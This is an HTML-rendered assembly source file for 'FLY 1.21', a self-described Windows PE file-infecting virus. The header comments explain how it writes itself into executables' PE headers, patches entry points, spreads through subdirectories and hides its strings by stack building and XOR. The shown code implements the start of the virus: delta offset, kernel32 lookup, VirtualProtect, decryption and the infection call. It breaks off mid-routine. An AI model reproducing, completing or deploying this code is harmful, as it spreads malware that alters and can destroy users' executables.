<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>fly.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc13 {
	color: #808080;
}
.sc14 {
	font-weight: bold;
	color: #804000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;@ECHO OFF</span><span class="sc0">
</span><span class="sc1">;GOTO MAKE</span><span class="sc0">

</span><span class="sc1">; COMMENT @</span><span class="sc0">
</span><span class="sc1">;               -=[ FLY ]=-</span><span class="sc0">
</span><span class="sc1">;                      a lame virus</span><span class="sc0">
</span><span class="sc1">;                        by yoda</span><span class="sc0">
</span><span class="sc1">; version: 1.21</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Music..................borrowed Nirvana-Nevermind CD/Busta Rhymes/KKS/RunDMC</span><span class="sc0">
</span><span class="sc1">; Assembler..............MASM</span><span class="sc0">
</span><span class="sc1">; Editor.................UltraEdit32</span><span class="sc0">
</span><span class="sc1">; Reason for coding......last school holiday day :)</span><span class="sc0">
</span><span class="sc1">; Target files...........PE32/PE32+ EXE files</span><span class="sc0">
</span><span class="sc1">; Payload................MessageBox if PC is already 30min up</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; It was nice to find out that KAV added FLY 1.1 to its virii database as Win32.Small.1144.</span><span class="sc0">
</span><span class="sc1">; The edge is that they didn't find the "FLY" trademark in the header and so it rests in</span><span class="sc0">
</span><span class="sc1">; disinfected files :)</span><span class="sc0">
</span><span class="sc1">; This version is fully recoded. The old code was often less optimized and such things.</span><span class="sc0">
</span><span class="sc1">; FLY 1.2 infects 32/64 bit EXE files in the current and in all subdirectries (it's called</span><span class="sc0">
</span><span class="sc1">; dot dot methode, I think).</span><span class="sc0">
</span><span class="sc1">; Whereby I don't know whether infected PE32+ files will run...I think:NO...in this case you'll</span><span class="sc0">
</span><span class="sc1">; have to look at FLY as a PE32 infector with a PE32+ destruction feature :)</span><span class="sc0">
</span><span class="sc1">; The virus body is neither appended at the target file image nor it's written into a</span><span class="sc0">
</span><span class="sc1">; section (like the RelocationDirectory section - .reloc). First I patch the file image</span><span class="sc0">
</span><span class="sc1">; to make the SizeOfHeaders 0x1000...move sections physically, fix NT/ST headers... And after</span><span class="sc0">
</span><span class="sc1">; that the virus body is written into the PE header. I didn't include any BoundImportDirectory</span><span class="sc0">
</span><span class="sc1">; processing. This Directory is always (I think) stored in the PE Header (after the</span><span class="sc0">
</span><span class="sc1">; SectionHeaderTable). If present, it maybe gets overwritten, so I simply clear the BoundImport</span><span class="sc0">
</span><span class="sc1">; DataDirectory in the DataDirectoryEntryTable.</span><span class="sc0">
</span><span class="sc1">; The EntryPoint RVA in the header of the victim isn't changed. FLY assembles...</span><span class="sc0">
</span><span class="sc1">;   PUSH    ptr_to_virus_body</span><span class="sc0">
</span><span class="sc1">;   RET</span><span class="sc0">
</span><span class="sc1">; ...at the EntryPoint and when the execution of the virus body is finished, it rewrites the</span><span class="sc0">
</span><span class="sc1">; orginal EntryPoint bytes and jumps to it.</span><span class="sc0">
</span><span class="sc1">; Because we don't have write access in the PE header in memory, one of the first steps FLY does</span><span class="sc0">
</span><span class="sc1">; is getting this access by the VirtualProtect API.</span><span class="sc0">
</span><span class="sc1">; I generally tried to avoid strings like "*.exe", "MZ", "MessageBoxA" in the virus body. This</span><span class="sc0">
</span><span class="sc1">; is reallized by different ways:obfuscation values, build strings on stack or by XORing the</span><span class="sc0">
</span><span class="sc1">; data partion of the virus. Any other protection schemes like Anti-Debugging, Polymorphism or</span><span class="sc0">
</span><span class="sc1">; things like that aren't used.</span><span class="sc0">
</span><span class="sc1">; Payload is a simply but topmost :) MessageBox if the PC is already 30min up.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Disclaimer:</span><span class="sc0">
</span><span class="sc1">; ~~~~~~~~~~~</span><span class="sc0">
</span><span class="sc1">; I AM NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS SOURCE CODE NOR IT'S COMPILED EXECUTABLE !</span><span class="sc0">
</span><span class="sc1">; I JUST CODED "FLY" FOR EDUCATION PURPOSES !</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; History:</span><span class="sc0">
</span><span class="sc1">; ~~~~~~~~</span><span class="sc0">
</span><span class="sc1">; 1.21: ( Virsu size: 0x715 Bytes )</span><span class="sc0">
</span><span class="sc1">; - finally added SEH frame in "GetNTHeaders" routine</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 1.2: ( Virus size: 0x6D7 Bytes )</span><span class="sc0">
</span><span class="sc1">; - all recoded (see above)</span><span class="sc0">
</span><span class="sc1">; - [...]</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 1.1: ( Virus size: 0x484 Bytes / 1156 Bytes )</span><span class="sc0">
</span><span class="sc1">; - Code optimized a bit</span><span class="sc0">
</span><span class="sc1">; - Boring PER added</span><span class="sc0">
</span><span class="sc1">; - API string CRC method added</span><span class="sc0">
</span><span class="sc1">; - Minor bugfixes</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 1.0: ( Virus size: 0x560 Bytes / 1376 Bytes )</span><span class="sc0">
</span><span class="sc1">; - first release</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; yoda</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; @</span><span class="sc0">

</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.MODEL</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">stdcall</span><span class="sc0">
</span><span class="sc9">OPTION</span><span class="sc0"> </span><span class="sc10">CASEMAP</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">NONE</span><span class="sc0">

</span><span class="sc1">; ------ INCLUDE's ----------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">INCLUDE</span><span class="sc0">     \</span><span class="sc5">masm32</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">windows.inc</span><span class="sc0">

</span><span class="sc9">INCLUDE</span><span class="sc0">     \</span><span class="sc5">masm32</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">kernel32.inc</span><span class="sc0">
</span><span class="sc9">INCLUDELIB</span><span class="sc0">  \</span><span class="sc5">masm32</span><span class="sc0">\</span><span class="sc5">lib</span><span class="sc0">\</span><span class="sc5">kernel32.lib</span><span class="sc0">

</span><span class="sc1">; ------ STRUCTS-------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">PUSHA_STRUCT</span><span class="sc0"> </span><span class="sc9">STRUCT</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">_EDI</span><span class="sc0">              </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_ESI</span><span class="sc0">              </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_EBP</span><span class="sc0">              </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_ESP</span><span class="sc0">              </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_EBX</span><span class="sc0">              </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_EDX</span><span class="sc0">              </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_ECX</span><span class="sc0">              </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_EAX</span><span class="sc0">              </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PUSHA_STRUCT</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc1">;SEH_DATA STRUCT 1</span><span class="sc0">
</span><span class="sc1">;   dwNewESP          DWORD ?</span><span class="sc0">
</span><span class="sc1">;   dwNewEIP          DWORD ?</span><span class="sc0">
</span><span class="sc1">;SEH_DATA ENDS</span><span class="sc0">

</span><span class="sc5">IMAGE_OPTIONAL_HEADER64</span><span class="sc0"> </span><span class="sc9">STRUCT</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
  </span><span class="sc5">Magic</span><span class="sc0">                         </span><span class="sc10">WORD</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">MajorLinkerVersion</span><span class="sc0">            </span><span class="sc10">BYTE</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">MinorLinkerVersion</span><span class="sc0">            </span><span class="sc10">BYTE</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">SizeOfCode</span><span class="sc0">                    </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">SizeOfInitializedData</span><span class="sc0">         </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">SizeOfUninitializedData</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">AddressOfEntryPoint</span><span class="sc0">           </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">BaseOfCode</span><span class="sc0">                    </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">ImageBase</span><span class="sc0">                     </span><span class="sc10">QWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">SectionAlignment</span><span class="sc0">              </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">FileAlignment</span><span class="sc0">                 </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">MajorOperatingSystemVersion</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">MinorOperatingSystemVersion</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">MajorImageVersion</span><span class="sc0">             </span><span class="sc10">WORD</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">MinorImageVersion</span><span class="sc0">             </span><span class="sc10">WORD</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">MajorSubsystemVersion</span><span class="sc0">         </span><span class="sc10">WORD</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">MinorSubsystemVersion</span><span class="sc0">         </span><span class="sc10">WORD</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">Win32VersionValue</span><span class="sc0">             </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">SizeOfImage</span><span class="sc0">                   </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">SizeOfHeaders</span><span class="sc0">                 </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">CheckSum</span><span class="sc0">                      </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">Subsystem</span><span class="sc0">                     </span><span class="sc10">WORD</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">DllCharacteristics</span><span class="sc0">            </span><span class="sc10">WORD</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">SizeOfStackReserve</span><span class="sc0">            </span><span class="sc10">QWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">SizeOfStackCommit</span><span class="sc0">             </span><span class="sc10">QWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">SizeOfHeapReserve</span><span class="sc0">             </span><span class="sc10">QWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">SizeOfHeapCommit</span><span class="sc0">              </span><span class="sc10">QWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">LoaderFlags</span><span class="sc0">                   </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">NumberOfRvaAndSizes</span><span class="sc0">           </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">DataDirectory</span><span class="sc0">                 </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0"> </span><span class="sc5">IMAGE_NUMBEROF_DIRECTORY_ENTRIES</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(&lt;&gt;)</span><span class="sc0">
</span><span class="sc5">IMAGE_OPTIONAL_HEADER64</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">IMAGE_NT_HEADERS64</span><span class="sc0"> </span><span class="sc9">STRUCT</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
  </span><span class="sc5">Signature</span><span class="sc0">         </span><span class="sc10">DWORD</span><span class="sc0">                   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">FileHeader</span><span class="sc0">        </span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc0">       </span><span class="sc4">&lt;&gt;</span><span class="sc0">
  </span><span class="sc5">OptionalHeader</span><span class="sc0">    </span><span class="sc5">IMAGE_OPTIONAL_HEADER64</span><span class="sc0"> </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">IMAGE_NT_HEADERS64</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc1">; ------ EQU's --------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">OBFUSCATION_VAL</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">018273645h</span><span class="sc0">
</span><span class="sc5">FLY_BODY_SIZE</span><span class="sc0">             </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">FLY_END</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">FLY_START</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">FLY_TRADEMARK</span><span class="sc0">             </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc3">"YLF"</span><span class="sc0">                                 </span><span class="sc1">; pasted in FileHeader.PointerToSymbolTable</span><span class="sc0">
</span><span class="sc5">VIRUS_OFFSET</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">01000h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">FLY_BODY_SIZE</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">MIN_PAYLOAD_TICK</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">                        </span><span class="sc1">; (30 min)</span><span class="sc0">

</span><span class="sc1">; ------ CODE ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">.CODE</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">NOTHING</span><span class="sc0">
</span><span class="sc5">Main</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">GetVersion</span><span class="sc0">         </span><span class="sc1">; The compiled exe won't run on Win2k without any Imports :(</span><span class="sc0">
                                    </span><span class="sc1">; This call is just for the first generation</span><span class="sc0">

</span><span class="sc5">FLY_START</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;   INT  3</span><span class="sc0">
    </span><span class="sc1">;-&gt; receive delta</span><span class="sc0">
    </span><span class="sc6">PUSHAD</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">get_delta</span><span class="sc0">
  </span><span class="sc5">get_delta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">OBFUSCATION_VAL</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">get_delta</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OBFUSCATION_VAL</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
        
        </span><span class="sc1">;-&gt; get kernel ImageBase</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">]</span><span class="sc5">.PUSHA_STRUCT._ESP</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetKernelBase</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">total_quit</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                                             </span><span class="sc1">; EDI -&gt; K32 base</span><span class="sc0">
        
        </span><span class="sc1">;-&gt; get write access for the virus body (in PE Header is usually ReadOnly access)</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc0">                                             </span><span class="sc1">; ESI -&gt; base ptr of our little stack frame</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"triV"</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"Plau"</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"etor"</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"tc"</span><span class="sc0">                           </span><span class="sc1">; build "VirtualProtect\0" str on stack</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">15</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetProcAddr</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">                                                  </span><span class="sc1">; reserve a DWORD on the stack as lpflOldProtect buff</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESP</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">PAGE_EXECUTE_READWRITE</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">FLY_BODY_SIZE</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FLY_START</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">                                                  </span><span class="sc1">; modify page access via VirtualProtect        </span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
        
        </span><span class="sc1">;-&gt; dexor our data partition</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dwEPRva</span><span class="sc4">]</span><span class="sc0">                                 </span><span class="sc1">; EBX -&gt; EntryPoint RVA (arg1)</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetXorByte</span><span class="sc0">                                           </span><span class="sc1">; returns 0 in first generation</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">Variable_Crypt_End</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Variable_Crypt_Start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Variable_Crypt_Start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">memxor</span><span class="sc0">          
        
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dwK32Base</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">                               </span><span class="sc1">; now we can save the K32 base</span><span class="sc0">

        </span><span class="sc1">;-&gt; collect addresses of needed APIs</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GrabAPIs</span><span class="sc0">
        
        </span><span class="sc1">;-&gt; PE infection</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">TraceAndInfectDirectory</span><span class="sc0">
        
    </span><span class="sc1">;-&gt; return to OS/original EntryPoint</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0">                                             </span><span class="sc1">; EBP == 0 -&gt; first generation</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">non_virgin_generation</span><span class="sc0">
  </span><span class="sc5">total_quit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">POPAD</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">                                                          </span><span class="sc1">; return to OS</span><span class="sc0">
    
  </span><span class="sc5">non_virgin_generation</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;-&gt; payload</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DriveUserNutsHiHi</span><span class="sc0">
        </span><span class="sc1">;-&gt; move EntryPoint ptr to EDI of the popad'd regs</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dwImageBase</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dwEPRva</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">]</span><span class="sc5">.PUSHA_STRUCT._EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc1">;-&gt; restore bytes at the EntryPoint</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">bEntryData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">memcpy</span><span class="sc0">
        </span><span class="sc6">POPAD</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc0">                                                  </span><span class="sc1">;-&gt; jump to victim's EntryPoint</span><span class="sc0">
    
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Args:</span><span class="sc0">
</span><span class="sc1">; [ESP + 4]   - initial ESP value</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Returns:</span><span class="sc0">
</span><span class="sc1">; ImageBase of Kernel32.dll or 0 in EAX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Reserved Regs: NO</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">GetKernelBase</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ARG_1</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc1">;INT     3</span><span class="sc0">
    </span><span class="sc1">; wipe LOWORD of K32 ptr</span><span class="sc0">
